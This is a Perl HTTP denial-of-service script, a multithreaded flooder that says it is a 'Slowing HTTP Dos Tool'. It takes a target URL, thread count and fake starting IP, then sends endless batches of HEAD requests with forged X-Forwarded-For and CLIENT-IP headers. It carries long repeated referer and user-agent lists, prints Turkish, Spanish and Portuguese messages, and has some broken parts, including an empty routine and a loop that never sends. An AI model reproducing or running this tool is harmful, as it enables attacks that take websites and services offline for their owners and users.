#!/usr/bin/perl
#require_once(main.irc);

use Term::ANSIColor;
use IO::Socket;

package control;

my $ip;


sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("Sem Ip!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;

my $ua = "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0";
my $ua = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)";
my $ua = "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179";
my $ua = "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)";
my $ua = "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)";
my $ua = "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)";

my $referer = "http://www.google.com/?q=";                                       
my $referer = "http://www.usatoday.com/search/results?q=";                       
my $referer = "http://engadget.search.aol.com/search?q=";                        
my $referer = "http://www.google.com/?q=";                                      
my $referer = "http://www.usatoday.com/search/results?q=";                       
my $referer = "http://engadget.search.aol.com/search?q=";                        
my $referer = "http://www.bing.com/search?q=";                                   
my $referer = "http://search.yahoo.com/search?p=";                               
my $referer = "http://www.ask.com/web?q=";
my $referer = "http://search.lycos.com/web/?q=";
my $referer = "http://busca.uol.com.br/web/?q=";
my $referer = "http://us.yhs4.search.yahoo.com/yhs/search?p=";
my $referer = "http://www.dmoz.org/search/search?q=";
my $referer = "http://www.baidu.com.br/s?usm=1&rn=100&wd=";
my $referer = "http://yandex.ru/yandsearch?text=";
my $referer = "http://www.zhongsou.com/third?w=";
my $referer = "http://hksearch.timway.com/search.php?query=";
my $referer = "http://find.ezilon.com/search.php?q=";
my $referer = "http://www.sogou.com/web?query=";
my $referer = "http://api.duckduckgo.com/html/?q=";
my $referer = "http://boorow.com/Pages/site_br_aspx?query=";
my $referer = "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..";
my $referer = "http://vk.com/profile.php?redirect=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=query?=query=..";
my $referer = "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1621&bih=882";
my $referer = "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1621&bih=925";
my $referer = "http://yandex.ru/yandsearch?text=";
my $referer = "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832";
my $referer = "http://go.mail.ru/search?mail.ru=1&q=";
my $referer = "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..";
my $referer = "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x21_%D0%..";
my $referer = "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..";
my $referer = "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..";
my $referer = "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..";
my $referer = "/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%21%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%21%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1621&bih=?882";
my $referer = "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..";
my $referer = "http://www.google.ru/url?sa=t&rct=?j&q=&e..";
my $referer = "http://help.baidu.com/searchResult?keywords=";
my $referer = "http://www.bing.com/search?q=";
my $referer = "https://www.yandex.com/yandsearch?text=";
my $referer = "https://duckduckgo.com/?q=";
my $referer = "http://www.ask.com/web?q=";
my $referer = "http://search.aol.com/aol/search?q=";
my $referer = "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=";
my $referer = "https://drive.google.com/viewerng/viewer?url=";
my $referer = "http://validator.w3.org/feed/check.cgi?url=";
my $referer = "http://host-tracker.com/check_page/?furl=";
my $referer = "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=";
my $referer = "http://jigsaw.w3.org/css-validator/validator?uri=";
my $referer = "https://add.my.yahoo.com/rss?url=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "https://steamcommunity.com/market/search?q=";
my $referer = "http://filehippo.com/search?q=";
my $referer = "http://www.topsiteminecraft.com/site/pinterest.com/search?q=";
my $referer = "http://eu.battle.net/wow/en/search?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "http://careers.gatesfoundation.org/search?q=";
my $referer = "http://techtv.mit.edu/search?q=";
my $referer = "http://www.ustream.tv/search?q=";
my $referer = "http://www.ted.com/search?q=";
my $referer = "http://funnymama.com/search?q=";
my $referer = "http://itch.io/search?q=";
my $referer = "http://jobs.rbs.com/jobs/search?q=";
my $referer = "http://taginfo.openstreetmap.org/search?q=";
my $referer = "http://www.baoxaydung.com.vn/news/vn/search&q=";
my $referer = "https://play.google.com/store/search?q=";
my $referer = "http://www.tceq.texas.gov/@@tceq-search?q=";
my $referer = "http://www.reddit.com/search?q=";
my $referer = "http://www.bestbuytheater.com/events/search?q=";
my $referer = "https://careers.carolinashealthcare.org/search?q=";
my $referer = "http://jobs.leidos.com/search?q=";
my $referer = "http://jobs.bloomberg.com/search?q=";
my $referer = "https://www.pinterest.com/search/?q=";
my $referer = "http://millercenter.org/search?q=";
my $referer = "https://www.npmjs.com/search?q=";
my $referer = "http://www.evidence.nhs.uk/search?q=";
my $referer = "http://www.shodanhq.com/search?q=";
my $referer = "http://ytmnd.com/search?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "https://steamcommunity.com/market/search?q=";
my $referer = "http://filehippo.com/search?q=";
my $referer = "http://www.topsiteminecraft.com/site/pinterest.com/search?q=";
my $referer = "http://eu.battle.net/wow/en/search?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "http://careers.gatesfoundation.org/search?q=";
my $referer = "http://techtv.mit.edu/search?q=";
my $referer = "http://www.ustream.tv/search?q=";
my $referer = "http://www.ted.com/search?q=";
my $referer = "http://funnymama.com/search?q=";
my $referer = "http://itch.io/search?q=";
my $referer = "http://jobs.rbs.com/jobs/search?q=";
my $referer = "http://taginfo.openstreetmap.org/search?q=";
my $referer = "http://www.baoxaydung.com.vn/news/vn/search&q=";
my $referer = "https://play.google.com/store/search?q=";
my $referer = "http://www.tceq.texas.gov/@@tceq-search?q=";
my $referer = "http://www.reddit.com/search?q=";
my $referer = "http://www.bestbuytheater.com/events/search?q=";
my $referer = "https://careers.carolinashealthcare.org/search?q=";
my $referer = "http://jobs.leidos.com/search?q=";
my $referer = "http://jobs.bloomberg.com/search?q=";
my $referer = "https://www.pinterest.com/search/?q=";
my $referer = "http://millercenter.org/search?q=";
my $referer = "https://www.npmjs.com/search?q=";
my $referer = "http://www.evidence.nhs.uk/search?q=";
my $referer = "http://www.shodanhq.com/search?q=";
my $referer = "http://ytmnd.com/search?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "https://steamcommunity.com/market/search?q=";
my $referer = "http://filehippo.com/search?q=";
my $referer = "http://www.topsiteminecraft.com/site/pinterest.com/search?q=";
my $referer = "http://eu.battle.net/wow/en/search?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "http://careers.gatesfoundation.org/search?q=";
my $referer = "http://techtv.mit.edu/search?q=";
my $referer = "http://www.ustream.tv/search?q=";
my $referer = "http://www.ted.com/search?q=";
my $referer = "http://funnymama.com/search?q=";
my $referer = "http://itch.io/search?q=";
my $referer = "http://jobs.rbs.com/jobs/search?q=";
my $referer = "http://taginfo.openstreetmap.org/search?q=";
my $referer = "http://www.baoxaydung.com.vn/news/vn/search&q=";
my $referer = "https://play.google.com/store/search?q=";
my $referer = "http://www.tceq.texas.gov/@@tceq-search?q=";
my $referer = "http://www.reddit.com/search?q=";
my $referer = "http://www.bestbuytheater.com/events/search?q=";
my $referer = "https://careers.carolinashealthcare.org/search?q=";
my $referer = "http://jobs.leidos.com/search?q=";
my $referer = "http://jobs.bloomberg.com/search?q=";
my $referer = "https://www.pinterest.com/search/?q=";
my $referer = "http://millercenter.org/search?q=";
my $referer = "https://www.npmjs.com/search?q=";
my $referer = "http://www.evidence.nhs.uk/search?q=";
my $referer = "http://www.shodanhq.com/search?q=";
my $referer = "http://ytmnd.com/search?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "https://steamcommunity.com/market/search?q=";
my $referer = "http://filehippo.com/search?q=";
my $referer = "http://www.topsiteminecraft.com/site/pinterest.com/search?q=";
my $referer = "http://eu.battle.net/wow/en/search?q=";
my $referer = "http://engadget.search.aol.com/search?q=";
my $referer = "http://careers.gatesfoundation.org/search?q=";
my $referer = "http://techtv.mit.edu/search?q=";
my $referer = "http://www.ustream.tv/search?q=";
my $referer = "http://www.ted.com/search?q=";
my $referer = "http://funnymama.com/search?q=";
my $referer = "http://itch.io/search?q=";
my $referer = "http://jobs.rbs.com/jobs/search?q=";
my $referer = "http://taginfo.openstreetmap.org/search?q=";
my $referer = "http://www.baoxaydung.com.vn/news/vn/search&q=";
my $referer = "https://play.google.com/store/search?q=";
my $referer = "http://www.tceq.texas.gov/@@tceq-search?q=";
my $referer = "http://www.reddit.com/search?q=";
my $referer = "http://www.bestbuytheater.com/events/search?q=";
my $referer = "https://careers.carolinashealthcare.org/search?q=";
my $referer = "http://jobs.leidos.com/search?q=";
my $referer = "http://jobs.bloomberg.com/search?q=";
my $referer = "https://www.pinterest.com/search/?q=";
my $referer = "http://millercenter.org/search?q=";
my $referer = "https://www.npmjs.com/search?q=";
my $referer = "http://www.evidence.nhs.uk/search?q=";
my $referer = "http://www.shodanhq.com/search?q=";
my $referer = "http://ytmnd.com/search?q=";
my $referer = "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=";
my $referer = "http://www.google.com/?q=";
my $referer = "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=";
my $referer = "https://drive.google.com/viewerng/viewer?url=";
my $referer = "http://www.google.com/translate?u=";
my $referer = "https://developers.google.com/speed/pagespeed/insights/?url=";
my $referer = "http://help.baidu.com/searchResult?keywords=";
my $referer = "http://www.bing.com/search?q=";
my $referer = "https://add.my.yahoo.com/rss?url=";
my $referer = "https://play.google.com/store/search?q=";
my $referer = "http://www.google.com/?q=";
my $referer = "http://www.usatoday.com/search/results?q=";
my $referer = "http://engadget.search.aol.com/search?q=";

my $method = "HEAD";
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z','hacker','sex','coder','Iphone','blackhat','whitehat','grayhat','AuraSuvari','Anonymous','Security',
'cod','hack to','you been hacked','vysion','red1','blue2','Smoke2','Magic','Planet','numers','letters','HF','facebook','google','twitter','instagram','packetstrom','turkhackteam','cyberwarrior','user-agent','shield'
,'Lord','prens','prenses','text','white','sessions','ack','syn','packet','release','renew','sword','spears','castle','siren','threads','start','blood','energy','sec','io','pack','bone','Legend','masa','ip','food',
,'error','boss','game','clash','royal','mozilla','TV','interested','manager','meeting','neighbour','news','opposite','serious','song','dancing','same','roof','river','restroom','repeat','repair','remember',
,'refrigerator','ready','railway','quick','push','possible','poor','pool','polite','pocket','plane','cloud','cheap','cartoon'
,'station', 'stem', 'stick', 'stocking', 'stomach', 'store', 'street', 'sun', 'table', 'tail', 'thread', 'throat', 'thumb', 'ticket', 'toe', 'tongue', 'tooth', 'town', 'train', 'tray', 'tree', 'trousers', 'umbrella', 
'wall', 'watch', 'wheel', 'whip', 'whistle', 'window', 'wing', 'wire', 'worm' ,'wash', 'waste', 'water', 'wave', 'wax', 'way', 'weather', 'week', 'weight', 'wind', 'wine', 'winter', 'woman', 'wood', 'wool', 'word', 
'work', 'wound', 'writing', 'year','sleep', 'slip', 'slope', 'smash', 'smell', 'smile', 'smoke', 'sneeze', 'snow', 'soap', 'society', 'son', 'song', 'sort', 'sound', 'soup', 'space', 'stage', 'start', 'statement', 
'steam', 'steel', 'step', 'stitch', 'stone', 'stop', 'story', 'stretch', 'structure','minute', 'mist', 'money', 'month', 'morning', 'mother', 'motion', 'mountain', 'move', 'music', 'name', 'nation', 'need', 'news', 
'night', 'noise', 'note', 'number', 'observation', 'offer', 'oil', 'operation', 'opinion', 'order', 'organization', 'ornament', 'owner','come', 'get', 'give', 'go', 'keep', 'let', 'make', 'put', 'seem', 'take', 'be', 'do', 'have', 'say', 'see',
'send', 'may', 'will', 'about', 'across', 'after', 'against', 'among', 'at', 'before', 'between', 'by', 'down', 'from', 'in', 'off', 'on', 'over', 'through', 'to','under', 'up', 'with', 'as', 'for', 'of', 'till','than',
'a', 'the', 'all', 'any', 'every', 'no', 'other', 'some', 'such', 'that', 'this', 'I', 'he', 'you', 'who', 'and','because', 'but', 'or', 'if', 'though', 'while', 'how', 'when', 'where','why', 'again', 'ever', 'far',
'forward', 'here', 'near', 'now', 'out', 'still', 'then', 'there','together', 'well', 'almost', 'enough', 'even', 'little', 'much', 'not', 'only', 'quite', 'so', 'very', 'tomorrow','yesterday', 'north', 'south', 
'east', 'west', 'please', 'yes','AuraSuvari','Anonymous','Security', 'will', 'about', 'across', 'after', 'against', 'among', 'at', 'before', 'between', 'by', 'down', 'from', 'in', 'off', 'on', 'over', 'through', 
'cod','hack to','you been hacked','vysion','red1','blue2','Smoke2','Magic','Planet','numers','letters','HF','facebook','google','twitter','instagram','packetstrom','turkhackteam','cyberwarrior','user-agent','shield'
,'Lord','prens','prenses','text','white','sessions','ack','syn','packet','release','renew','sword','spears','castle','siren','threads','start','blood','energy','sec','io','pack','bone','Legend','masa','ip','food',
,'error','boss','game','clash','royal','mozilla','TV','interested','manager','meeting','neighbour','news','opposite','serious','song','dancing','same','roof','river','restroom','repeat','repair','remember',
,'refrigerator','ready','railway','quick','push','possible','poor','pool','polite','pocket','plane','cloud','cheap','cartoon','AuraSuvari','Anonymous','Security',

,0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            print "Successful Target was shot in Figure";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nReferer: ",$referer,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}


sub sendertechnic
{

 
  

}


sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\nAttack Started\n\n";
            next;
        }
        print $sock $paquete;
    }
}


sub sender3 {
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            print "Success Attack3";
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nReferer: ",$referer,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { print "Ölü...\n"; threads->exit(); };
    $url = $ARGV[0];
		print color 'bold blue';
    print "URL: ".$url."\n";
		print color 'reset';
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "[-]Hazırlanıyor...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] URL Geçersiz!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
		print color 'bold blue';
    print join "","[!]",$max," Laser Upload!\n";
    $file = "/".$file if($file !~ /^\//);
    print join "","Hedef: ",$host,":",$puerto,"\nUzantı: ",$file,"\n\n";
		print color 'reset';
		print color 'green';
    print "[+]Connected irc.Laser.com ...\n";
		print "[!]Slowing HTTP Dos Tool\n";
		print color 'reset';
    if($ipfake eq "") {
        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nReferer: ",$referer,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
						$thr[$v] = threads->create('sendertechnic', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
						$thr[$v] = threads->create('sender3', ($porconexion,$puerto,$host,$file));
        }
    }
    print "[+]Attack Started...\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(5);
            $v--;
        }
    }
    print "FIM!\n";
}


if($#ARGV > 2) {
    comenzar();
} else {
	die("\n
	
＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿
| SECURİT　　　　　　　　　　　　　　　　　　     [－] [口] [×]             |
| ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣  ￣  |
|　Are you ready to attack?                                    |
|  Do you agree? 　　　　　　                                      |
|　 　　＿＿＿＿＿＿　　　　＿＿＿＿＿＿　　　　＿＿＿＿＿　　             |
| 　 　｜　  Yes   |    |    No    |     | Cancel |              |
|　 　　￣￣￣￣￣￣　　　　￣￣￣￣￣￣　　　　￣￣￣￣￣　              |
|＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ __  _|﻿
	
	\n");
  
}
